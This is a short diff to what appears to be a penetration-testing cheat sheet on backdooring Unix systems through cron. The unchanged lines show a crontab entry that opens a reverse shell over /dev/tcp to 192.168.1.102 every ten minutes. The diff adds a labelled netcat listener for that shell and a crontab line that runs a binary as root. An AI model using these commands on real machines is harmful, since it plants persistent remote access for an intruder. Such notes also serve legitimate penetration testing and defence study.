@@ -45,9 +45,18 @@ crontab -e
 */10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
 ```
 
+Listener
 ```
 nc -lvp 5556
 ```
+
+Sometimes you have to set the user
+```
+crontab -e
+*/10 * * * * root /path/to/binary
+```
+
+
 
 ### References:
 http://kaoticcreations.blogspot.cl/2012/07/backdooring-unix-system-via-cron.html
